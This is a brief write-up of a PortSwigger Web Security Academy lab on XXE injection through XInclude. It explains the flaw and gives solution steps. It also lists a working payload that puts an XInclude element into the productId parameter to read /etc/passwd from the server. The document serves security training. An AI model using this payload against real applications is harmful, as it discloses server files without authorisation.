# Lab: Exploiting XInclude to retrieve files

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

**Lab idea:** Here, user input is embedded in a server-side XML document, so the tester does not control the whole document or its DTD. The challenge practices recognizing XInclude as an alternate XML inclusion surface and understanding its file-disclosure implications.

## Vulnerability in brief
XML external entity (XXE) injection is a vulnerability in applications that process attacker-influenced XML. When an XML parser resolves externally defined entities, the application may be made to access local files or issue network requests using the server's own access and network position. Whether data is exposed directly depends on how the application handles parsed values and errors.

## Solution idea
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Set the value of the productId parameter to: <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

## Payloads / key values
- `productId`
- `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

## Official source
- [PortSwigger Academy: Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
